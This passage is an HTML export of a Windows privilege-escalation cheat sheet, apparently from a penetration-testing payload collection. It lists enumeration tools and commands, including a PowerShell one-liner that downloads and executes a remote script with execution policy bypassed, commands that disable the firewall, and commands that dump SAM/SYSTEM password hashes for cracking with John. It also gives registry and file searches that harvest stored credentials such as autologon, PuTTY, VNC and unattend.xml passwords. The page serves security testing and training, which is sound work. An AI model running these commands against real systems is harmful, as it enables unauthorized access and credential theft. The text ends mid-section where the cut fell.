<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Windows - Privilege Escalation</title><style>
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark-href {
	font-size: 0.75em;
	opacity: 0.5;
}

.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif; }
.mono { font-family: Nitti, 'Microsoft YaHei', '微软雅黑', monospace; }
.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .code { font-family: Source Code Pro, 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .mono { font-family: PT Mono, Nitti, 'Microsoft YaHei', '微软雅黑', monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.highlight-default {
}
.highlight-gray {
	color: rgb(155,154,151);
}
.highlight-brown {
	color: rgb(100,71,58);
}
.highlight-orange {
	color: rgb(217,115,13);
}
.highlight-yellow {
	color: rgb(223,171,1);
}
.highlight-teal {
	color: rgb(15,123,108);
}
.highlight-blue {
	color: rgb(11,110,153);
}
.highlight-purple {
	color: rgb(105,64,165);
}
.highlight-pink {
	color: rgb(173,26,114);
}
.highlight-red {
	color: rgb(224,62,62);
}
.highlight-gray_background {
	background: rgb(235,236,237);
}
.highlight-brown_background {
	background: rgb(233,229,227);
}
.highlight-orange_background {
	background: rgb(250,235,221);
}
.highlight-yellow_background {
	background: rgb(251,243,219);
}
.highlight-teal_background {
	background: rgb(221,237,234);
}
.highlight-blue_background {
	background: rgb(221,235,241);
}
.highlight-purple_background {
	background: rgb(234,228,242);
}
.highlight-pink_background {
	background: rgb(244,223,235);
}
.highlight-red_background {
	background: rgb(251,228,228);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(55, 53, 47, 0.6);
	fill: rgba(55, 53, 47, 0.6);
}
.block-color-brown {
	color: rgb(100,71,58);
	fill: rgb(100,71,58);
}
.block-color-orange {
	color: rgb(217,115,13);
	fill: rgb(217,115,13);
}
.block-color-yellow {
	color: rgb(223,171,1);
	fill: rgb(223,171,1);
}
.block-color-teal {
	color: rgb(15,123,108);
	fill: rgb(15,123,108);
}
.block-color-blue {
	color: rgb(11,110,153);
	fill: rgb(11,110,153);
}
.block-color-purple {
	color: rgb(105,64,165);
	fill: rgb(105,64,165);
}
.block-color-pink {
	color: rgb(173,26,114);
	fill: rgb(173,26,114);
}
.block-color-red {
	color: rgb(224,62,62);
	fill: rgb(224,62,62);
}
.block-color-gray_background {
	background: rgb(235,236,237);
}
.block-color-brown_background {
	background: rgb(233,229,227);
}
.block-color-orange_background {
	background: rgb(250,235,221);
}
.block-color-yellow_background {
	background: rgb(251,243,219);
}
.block-color-teal_background {
	background: rgb(221,237,234);
}
.block-color-blue_background {
	background: rgb(221,235,241);
}
.block-color-purple_background {
	background: rgb(234,228,242);
}
.block-color-pink_background {
	background: rgb(244,223,235);
}
.block-color-red_background {
	background: rgb(251,228,228);
}

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="344735f0-83b7-4205-bcdb-b462a7683c42" class="page sans"><header><h1 class="page-title">Windows - Privilege Escalation</h1></header><div class="page-body"><h1 id="af555e67-0880-4e88-bc2f-14a8ecc4c99c" class="">Windows - Privilege Escalation</h1><h2 id="a65913d5-3885-477f-a949-ca1e750cdb0c" class="">Summary</h2><ul id="655568de-cacc-40eb-8ff8-1878d5f39570" class="bulleted-list"><li><a href="about:blank#tools">Tools</a></li></ul><ul id="4213d5a9-844b-492f-a413-68106b097595" class="bulleted-list"><li><a href="about:blank#windows-version-and-configuration">Windows Version and Configuration</a></li></ul><ul id="d562ef86-7c7f-4e09-aadf-8feb54475dde" class="bulleted-list"><li><a href="about:blank#user-enumeration">User Enumeration</a></li></ul><ul id="85176862-99cb-4863-8d42-d6a5e908abac" class="bulleted-list"><li><a href="about:blank#network-enumeration">Network Enumeration</a></li></ul><ul id="428fb1ca-2e70-4df4-a2b8-ded074ce66be" class="bulleted-list"><li><a href="about:blank#applocker-enumeration">AppLocker Enumeration</a></li></ul><ul id="18aa4e1c-f509-4a1e-b61e-bf80ab6a6f84" class="bulleted-list"><li><a href="about:blank#eop---looting-for-passwords">EoP - Looting for passwords</a><ul id="235ee5cb-254c-41b4-8c3c-2d537f6cf23b" class="bulleted-list"><li><a href="about:blank#sam-and-system-files">SAM and SYSTEM files</a></li></ul><ul id="d77ae85d-b788-4d28-890e-0575781649f3" class="bulleted-list"><li><a href="about:blank#search-for-file-contents">Search for file contents</a></li></ul><ul id="45174a55-4830-4f08-8c00-da6bd06c488c" class="bulleted-list"><li><a href="about:blank#search-for-a-file-with-a-certain-filename">Search for a file with a certain filename</a></li></ul><ul id="e6f2242f-e3d5-4527-b789-2e8417f34df5" class="bulleted-list"><li><a href="about:blank#search-the-registry-for-key-names-and-passwords">Search the registry for key names and passwords</a></li></ul><ul id="b3294048-17a8-48af-ba07-c1f9796d4bdf" class="bulleted-list"><li><a href="about:blank#passwords-in-unattend.xml">Passwords in unattend.xml</a></li></ul><ul id="919a9ea0-8cea-442b-a7c6-93eae545e590" class="bulleted-list"><li><a href="about:blank#wifi-passwords">Wifi passwords</a></li></ul><ul id="0d964f0b-62bd-4cd9-8b64-cfa7eac7309f" class="bulleted-list"><li><a href="about:blank#passwords-stored-in-services">Passwords stored in services</a></li></ul><ul id="de4e8b8c-adec-4744-979b-57a83e5073e9" class="bulleted-list"><li><a href="about:blank#powershell-history">Powershell history</a></li></ul></li></ul><ul id="a77bee30-30c0-4b75-bdd6-0d1bd90588c0" class="bulleted-list"><li><a href="about:blank#eop---processes-enumeration-and-tasks">EoP - Processes Enumeration and Tasks</a></li></ul><ul id="f2803ddd-b1d4-4da8-acc8-638bd3ad3d6e" class="bulleted-list"><li><a href="about:blank#eop---incorrect-permissions-in-services">EoP - Incorrect permissions in services</a></li></ul><ul id="637ddbf9-3dc8-4850-a9e5-3eed445fa10f" class="bulleted-list"><li><a href="about:blank#eop---windows-subsystem-for-linux-wsl">EoP - Windows Subsystem for Linux (WSL)</a></li></ul><ul id="f7aa7b48-6b61-41b9-bfbf-fcb7b874daac" class="bulleted-list"><li><a href="about:blank#eop---unquoted-service-paths">EoP - Unquoted Service Paths</a></li></ul><ul id="7865feed-b615-4876-9ac7-f1f5a9f38e64" class="bulleted-list"><li><a href="about:blank#eop---named-pipes">EoP - Named Pipes</a></li></ul><ul id="b45d3b65-2c8e-4c69-a7e3-fac107765a00" class="bulleted-list"><li><a href="about:blank#eop---kernel-exploitation">EoP - Kernel Exploitation</a></li></ul><ul id="a7ee3a89-2baf-4516-a802-7164ef28c0df" class="bulleted-list"><li><a href="about:blank#eop---alwaysinstallelevated">EoP - AlwaysInstallElevated</a></li></ul><ul id="f3ef3152-cade-432d-b23d-e4adb1a7a07e" class="bulleted-list"><li><a href="about:blank#eop---insecure-gui-apps">EoP - Insecure GUI apps</a></li></ul><ul id="3a4bd203-ec26-47bb-b99b-3eb7e1988422" class="bulleted-list"><li><a href="about:blank#eop---runas">EoP - Runas</a></li></ul><ul id="8347c589-02c6-4b35-9298-174d034bc053" class="bulleted-list"><li><a href="about:blank#eop---from-local-administrator-to-nt-system">EoP - From local administrator to NT SYSTEM</a></li></ul><ul id="8eeb5499-2940-4bfb-b8db-993d9f5a94bc" class="bulleted-list"><li><a href="about:blank#eop---living-off-the-land-binaries-and-scripts">EoP - Living Off The Land Binaries and Scripts</a></li></ul><ul id="dd5de908-218a-4826-8ef2-425d4aba6647" class="bulleted-list"><li><a href="about:blank#eop---impersonation-privileges">EoP - Impersonation Privileges</a><ul id="b7fe2318-14a6-47f3-a8ac-2f12653bf823" class="bulleted-list"><li><a href="about:blank#meterpreter-getsystem-and-alternatives">Meterpreter getsystem and alternatives</a></li></ul><ul id="3e2347e4-79af-43a5-8821-d6fc35dc79a8" class="bulleted-list"><li><a href="about:blank#rottenpotato-token-impersonation">RottenPotato (Token Impersonation)</a></li></ul><ul id="51f6b90b-7003-4e3b-9c0e-ecce4465ca09" class="bulleted-list"><li><a href="about:blank#juicy-potato-abusing-the-golden-privileges">Juicy Potato (abusing the golden privileges)</a></li></ul></li></ul><ul id="3c862ac9-fcce-4966-b307-3af3f993e4bd" class="bulleted-list"><li><a href="about:blank#eop---common-vulnerabilities-and-exposure">EoP - Common Vulnerabilities and Exposures</a><ul id="198df1e1-5661-4a42-9a37-fcaa41573f18" class="bulleted-list"><li><a href="about:blank#ms08-067-netapi">MS08-067 (NetAPI)</a></li></ul><ul id="7fb6a796-33e2-48c1-9159-ab70b102ab6f" class="bulleted-list"><li><a href="about:blank#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7">MS10-015 (KiTrap0D)</a></li></ul><ul id="7c17f93c-b0ab-4e10-bc06-f215f599ee88" class="bulleted-list"><li><a href="about:blank#ms11-080-afd.sys---microsoft-windows-xp-2003">MS11-080 (adf.sys)</a></li></ul><ul id="e2314fc3-273c-47cb-97db-de92fd9decd6" class="bulleted-list"><li><a href="about:blank#ms15-051---microsoft-windows-2003--2008--7--8--2012">MS15-051 (Client Copy Image)</a></li></ul><ul id="85b20860-f94f-4cce-8ac6-44c3843f18ac" class="bulleted-list"><li><a href="about:blank#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64">MS16-032</a></li></ul><ul id="141d3198-e038-4f15-ba8a-a7a49c095d75" class="bulleted-list"><li><a href="about:blank#ms17-010-eternal-blue">MS17-010 (Eternal Blue)</a></li></ul><ul id="db142d62-be44-41d7-83bd-5401b23028f8" class="bulleted-list"><li><a href="about:blank#cve-2019-1388">CVE-2019-1388</a></li></ul></li></ul><ul id="ab27465f-fb94-425e-866d-c424b16facdf" class="bulleted-list"><li><a href="about:blank#references">References</a></li></ul><h2 id="6ad5e633-e9a9-4725-b11c-a863933cfea1" class="">Tools</h2><ul id="a075ca12-4df9-4c3a-ae8c-5b9c3f0dc30e" class="bulleted-list"><li><a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit’s PowerUp</a> <code>powershell powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;); Invoke-AllChecks</code></li></ul><ul id="e671228f-025a-4a92-b7d8-dbc78fe69629" class="bulleted-list"><li><a href="https://github.com/rasta-mouse/Watson">Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock</a></li></ul><ul id="f7c47e07-9bf9-40cc-9c53-68d06cc116f0" class="bulleted-list"><li><a href="https://github.com/rasta-mouse/Sherlock">(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities</a> <code>powershell powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1</code></li></ul><ul id="3ef3da1e-62c0-427a-aa48-1d725dbab92b" class="bulleted-list"><li><a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></li></ul><ul id="0536d23e-0f1f-4ac9-a63e-720ec2b8c995" class="bulleted-list"><li><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a> <code>powershell ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt</code></li></ul><ul id="a6912c67-fb7b-4ff5-8a95-6b70255630be" class="bulleted-list"><li><a href="https://github.com/pentestmonkey/windows-privesc-check">windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems</a></li></ul><ul id="c44d1c3f-dfc1-46a2-b413-cacf3d177d01" class="bulleted-list"><li><a href="https://github.com/abatchy17/WindowsExploits">WindowsExploits - Windows exploits, mostly precompiled. Not being updated.</a></li></ul><ul id="aa195346-7641-4674-8438-221ff842d6a8" class="bulleted-list"><li><a href="https://github.com/absolomb/WindowsEnum">WindowsEnum - A Powershell Privilege Escalation Enumeration Script.</a></li></ul><ul id="4f4d34b7-3323-4c95-93ba-2f4e94c7a319" class="bulleted-list"><li><a href="https://github.com/GhostPack/Seatbelt">Seatbelt - A C# project that performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives.</a></li></ul><ul id="26b8de37-2062-4723-bb6a-5473bbbb2091" class="bulleted-list"><li><a href="https://github.com/M4ximuss/Powerless">Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind</a></li></ul><ul id="c822b068-13e4-4a99-81c4-6759386d3cdc" class="bulleted-list"><li><a href="https://github.com/411Hall/JAWS">JAWS - Just Another Windows (Enum) Script</a> <code>powershell powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt</code></li></ul><h2 id="81333e22-1e1e-4aba-bf08-98a55074f7ec" class="">Windows Version and Configuration</h2><pre id="51bfd553-d9aa-41fc-a154-75d08d527945" class="code"><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></pre><p id="df173d92-1c91-413e-98fc-ab6599bdb1ec" class="">Extract patchs and updates</p><pre id="8fecfd7d-d17d-434a-bf8a-555515ad8ec2" class="code"><code>wmic qfe</code></pre><p id="cf317d5d-f6c4-4528-84d1-9747b9399b55" class="">Architecture</p><pre id="947a96ba-24df-4464-9596-0ef5eac4dd13" class="code"><code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%</code></pre><p id="07512e6a-e8f6-4fee-a392-7eb15d3da950" class="">List all env variables</p><pre id="68428be3-41c9-481a-9205-8af6b8a3cde2" class="code"><code>setGet-ChildItem Env: | ft Key,Value</code></pre><p id="2d330988-a07e-47be-876e-55cee37b63d9" class="">List all drives</p><pre id="e1ade5d8-d08a-4964-8a2b-e5176bbe680f" class="code"><code>wmic logicaldisk get caption || fsutil fsinfo driveswmic logicaldisk get caption,description,providernameGet-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root</code></pre><h2 id="a63fcafc-e625-4615-a916-840b1a4b33e4" class="">User Enumeration</h2><p id="4035361c-eadd-454b-8cab-f9b1ef08a3c9" class="">Get current username</p><pre id="baa0a11a-e4e6-42de-841d-9073fdb108f1" class="code"><code>echo %USERNAME% || whoami$env:username</code></pre><p id="686617e0-96da-4755-86ba-e51b34cfe76a" class="">List user privilege</p><pre id="9c02454e-742a-4c0b-a01c-13c377e26744" class="code"><code>whoami /priv</code></pre><p id="464b1d11-651f-40cf-8b7d-6e954bccf825" class="">List all users</p><pre id="4ab7fbd3-cbb1-471b-ade6-7b32f8e348b3" class="code"><code>net userwhoami /allGet-LocalUser | ft Name,Enabled,LastLogonGet-ChildItem C:\Users -Force | select Name</code></pre><p id="d932bed0-6f01-4d9e-8029-1172e328aed5" class="">List logon requirements; useable for bruteforcing</p><pre id="7429c30c-291f-46bc-848d-843a9690b311" class="code"><code>net accounts</code></pre><p id="8a7305cb-fb58-49b2-bada-e574be638569" class="">Get details about a user (i.e. administrator, admin, current user)</p><pre id="8a470103-6951-46e1-9c3e-d607ac0fa0c8" class="code"><code>net user administratornet user adminnet user %USERNAME%</code></pre><p id="eaef0104-19eb-4868-b7e4-ae723231e8f0" class="">List all local groups</p><pre id="c3a73c58-cc39-4da4-a85e-a28fc1864265" class="code"><code>net localgroupGet-LocalGroup | ft Name</code></pre><p id="81826f09-fbe2-4b6c-925c-b4e432a77055" class="">Get details about a group (i.e. administrators)</p><pre id="3a91602a-3ff7-47da-a9eb-c0ab567f3676" class="code"><code>net localgroup administratorsGet-LocalGroupMember Administrators | ft Name, PrincipalSourceGet-LocalGroupMember Administrateurs | ft Name, PrincipalSource</code></pre><h2 id="48afa0d9-4617-48fd-b947-f34b9f4ada12" class="">Network Enumeration</h2><p id="0fd68f1a-53ae-441c-8628-a435217175cb" class="">List all network interfaces, IP, and DNS.</p><pre id="8a7b7ca6-9336-40fc-a9a7-54b9227e4472" class="code"><code>ipconfig /allGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4AddressGet-DnsClientServerAddress -AddressFamily IPv4 | ft</code></pre><p id="f0609d94-966e-4a7e-95f6-2a4643c2bf76" class="">List current routing table</p><pre id="49ad1ca3-4f9e-486b-87cb-d36705c3edf6" class="code"><code>route printGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex</code></pre><p id="90830b05-bef5-4e5c-8f72-7c974c19fa77" class="">List the ARP table</p><pre id="174a09bf-954a-4bfa-a4d3-b1573c3b6de4" class="code"><code>arp -AGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State</code></pre><p id="7fe35903-aacd-4ad1-b7ce-1e34785d9f53" class="">List all current connections</p><pre id="aa72a6a6-065e-4727-b966-712eb401ad8e" class="code"><code>netstat -ano</code></pre><p id="8f741d8f-2c5b-4a3a-860c-4f61abca7022" class="">List firewall state and current configuration</p><pre id="cd268062-b2af-480a-879f-ce0e5a066eff" class="code"><code>netsh advfirewall firewall dumpornetsh firewall show statenetsh firewall show config</code></pre><p id="f43a65ff-0c4b-42be-ae70-171d859e76f6" class="">List firewall’s blocked ports</p><pre id="3c17d899-85e1-4fb9-82f2-4a18368b3394" class="code"><code>$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq &quot;0&quot;} | select name,applicationname,localports</code></pre><p id="648ff0e2-2dfd-41dd-bf90-6631fee24968" class="">Disable firewall</p><pre id="a2c0e9b4-fe76-4166-bcae-cfb1cc0b7e49" class="code"><code>netsh firewall set opmode disablenetsh advfirewall set allprofiles state off</code></pre><p id="46cea707-46c3-409e-91ed-ffdcbe2c9202" class="">List all network shares</p><pre id="7819e2b1-b547-4e10-8c14-d6ce079d1872" class="code"><code>net share</code></pre><p id="7e361d51-fcec-4a94-b07b-395ab2c3861d" class="">SNMP Configuration</p><pre id="929e0b79-9617-4bb4-9c4e-5b4c611f179e" class="code"><code>reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /sGet-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse</code></pre><h2 id="f633d354-07ce-4826-8af7-0b0fd0fd7d5f" class="">AppLocker Enumeration</h2><ul id="2a5e2eae-7ab5-4d75-97ca-25e23f3c095d" class="bulleted-list"><li>With the GPO</li></ul><ul id="cad2258f-1169-407b-970f-f5ec9e651d00" class="bulleted-list"><li>HKLM2 (Keys: Appx, Dll, Exe, Msi and Script).</li></ul><h2 id="08f4ca71-c679-43ab-870b-b62c23236d87" class="">EoP - Looting for passwords</h2><h3 id="7adcb265-a8af-4984-9e21-2d571de96308" class="">SAM and SYSTEM files</h3><p id="351383df-df20-43ba-9348-d34ef8884d62" class="">The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.</p><pre id="0c22ff01-716c-4562-bb9c-c12e222e76aa" class="code"><code># Usually %SYSTEMROOT% = C:\Windows%SYSTEMROOT%\repair\SAM%SYSTEMROOT%\System32\config\RegBack\SAM%SYSTEMROOT%\System32\config\SAM%SYSTEMROOT%\repair\system%SYSTEMROOT%\System32\config\SYSTEM%SYSTEMROOT%\System32\config\RegBack\system</code></pre><p id="b4183beb-1856-456f-bab6-f1e37468516c" class="">Generate a hash file for John using <code>pwdump</code> or <code>samdump2</code>.</p><pre id="4ee211e9-0be7-4e83-9f03-51950afdf49e" class="code"><code>pwdump SYSTEM SAM &gt; /root/sam.txtsamdump2 SYSTEM SAM -o sam.txt</code></pre><p id="9ae6b9d9-db98-43b1-82ff-ba52df5d58e5" class="">Then crack it with <code>john -format=NT /root/sam.txt</code>.</p><h3 id="56fe9286-8013-46d3-8b5b-bec9af5c8d48" class="">Search for file contents</h3><pre id="0b5cd17a-94e5-4805-95f6-15c1de934051" class="code"><code>cd C:\ &amp; findstr /SI /M &quot;password&quot; *.xml *.ini *.txtfindstr /si password *.xml *.ini *.txt *.configfindstr /spin &quot;password&quot; *.*</code></pre><h3 id="1d33859a-c2f6-4a46-9bd4-d728a53b2938" class="">Search for a file with a certain filename</h3><pre id="68e91142-8c0c-4bad-b944-617e8df0d474" class="code"><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*where /R C:\ user.txtwhere /R C:\ *.ini</code></pre><h3 id="a9ff9c33-feec-4028-b6f3-71b330070c94" class="">Search the registry for key names and passwords</h3><pre id="b6def28b-d335-41f0-8bca-195ef888f542" class="code"><code>REG QUERY HKLM /F &quot;password&quot; /t REG_SZ /S /KREG QUERY HKCU /F &quot;password&quot; /t REG_SZ /S /Kreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; # Windows Autologinreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot; # SNMP parametersreg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; # Putty clear text proxy credentialsreg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot; # VNC credentialsreg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v passwordreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre><h3 id="ec25ab1b-a30f-4d6c-9b7e-e91594bc062a" class="">Read a value of a certain sub key</h3><pre id="be6e02ef-d5fc-4996-948a-30fe0757871b" class="code"><code>REG QUERY &quot;HKLM\Software\Microsoft\FTH&quot; /V RuleList</code></pre><h3 id="0543cd52-1082-455d-9186-b0ce511c4f3a" class="">Passwords in unattend.xml</h3><p id="a2ac8a54-4f73-44f2-846f-76bf3bad2fad" class="">Location of the unattend.xml files.</p><pre id="f9278e13-44ba-463a-a6a9-32f2a907f825" class="code"><code>C:\unattend.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattend\Unattend.xmlC:\Windows\system32\sysprep.infC:\Windows\system32\sysprep\sysprep.xml</code></pre><p 